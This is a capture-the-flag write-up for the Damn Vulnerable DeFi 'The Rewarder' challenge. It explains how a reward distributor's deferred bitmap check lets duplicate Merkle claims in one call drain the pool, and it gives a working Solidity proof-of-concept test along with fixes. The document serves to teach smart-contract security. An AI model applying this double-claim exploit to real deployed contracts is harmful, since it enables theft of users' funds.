# The Rewarder - Claiming the Same Reward Hundreds of Times in One Call

**Challenge:** Damn Vulnerable DeFi v4 - The Rewarder
**Category:** Broken Invariant / Deferred Double-Claim Check
**Severity:** Critical (the whole reward pool is drained by a single legitimate beneficiary)

## What's going on

A distributor hands out two tokens (DVT and WETH) using Merkle trees. Each beneficiary
has one valid leaf per token, and a bitmap is supposed to stop anyone from claiming the
same batch twice. The player is a normal beneficiary with a normal reward, and the goal
is to rescue as much of the remaining pool as possible into a recovery account.

Claiming rewards for several tokens in one call is supported, and the contract tries to
save gas by recording "already claimed" bits in batches. That optimization is the bug.

## The bug

`claimRewards` loops over the claims, and `_setClaimed` (which checks and sets the
bitmap) is only called in two places: when the token changes between claims, and on the
last claim:

```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (address(token) != address(0)) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }
    token = inputTokens[inputClaim.tokenIndex];
    bitsSet = 1 << bitPosition;
    amount = inputClaim.amount;
} else {
    bitsSet = bitsSet | 1 << bitPosition;
    amount += inputClaim.amount;
}

if (i == inputClaims.length - 1) {
    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
}
```

In between, the loop only ORs the bit into an accumulator. Meanwhile every iteration
still verifies the proof (which passes, since it is a real leaf) and transfers the
claim's amount to the caller:

```solidity
inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
```

So repeated copies of the same claim, grouped by token, are each paid out, but the
bitmap is consulted only once per group. Duplicate bits collapse into a single bit when
ORed, so the one check at the end sees a bit that was never set before and passes.

## The attack

1. Look up the player's own entry (amount and Merkle proof) in each distribution.
2. Work out how many times the player's reward fits into the distributor's balance for
   each token, so the repeated payouts stop just before the pool runs dry.
3. Build a single `claimRewards` call with that many copies of the DVT claim followed by
   that many copies of the WETH claim. Keeping each token's claims consecutive means the
   bitmap is checked only once per token.
4. Send everything received to the recovery account.

## PoC

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    (uint256 dvtAmount, bytes32[] memory dvtProof) = _playerEntry("/test/the-rewarder/dvt-distribution.json");
    (uint256 wethAmount, bytes32[] memory wethProof) = _playerEntry("/test/the-rewarder/weth-distribution.json");

    uint256 dvtClaims = dvt.balanceOf(address(distributor)) / dvtAmount;
    uint256 wethClaims = weth.balanceOf(address(distributor)) / wethAmount;

    IERC20[] memory tokens = new IERC20[](2);
    tokens[0] = IERC20(address(dvt));
    tokens[1] = IERC20(address(weth));

    Claim[] memory claims = new Claim[](dvtClaims + wethClaims);
    for (uint256 i = 0; i < dvtClaims; i++) {
        claims[i] = Claim({batchNumber: 0, amount: dvtAmount, tokenIndex: 0, proof: dvtProof});
    }
    for (uint256 i = 0; i < wethClaims; i++) {
        claims[dvtClaims + i] = Claim({batchNumber: 0, amount: wethAmount, tokenIndex: 1, proof: wethProof});
    }

    distributor.claimRewards({inputClaims: claims, inputTokens: tokens});

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

`_playerEntry` is a small helper that reads the JSON file, finds the player's index, and
builds the proof with Murky. Full test file: `test/the-rewarder/TheRewarder.t.sol`

## Why I'm calling this Critical

- **Total loss of the pool.** A single honest beneficiary takes everything left, not
  just their share.
- **No special access.** Any address with one valid leaf can do it.
- **One transaction.** There is no way to react between the claims.
- **The replay protection is the feature that fails.** The Merkle proof is valid and the
  bitmap exists, but the bitmap is checked too late to matter.

## Fix

- Check and set the claimed bit **for every claim, inside the loop, before** the transfer.
  Verify the proof, mark it claimed, then pay out.
- If the gas optimization is kept, reject a batch that contains duplicate
  (token, batch) pairs instead of silently merging them.
- Follow checks-effects-interactions per item rather than per group.

## Takeaway

When a loop accumulates state and commits it only at the end or on a condition, check
whether the real effects (transfers, mints) happen inside the loop before the commit.
Gas optimizations that defer validation are a common source of bugs: the validation and
the payout must stay tied together for every item.
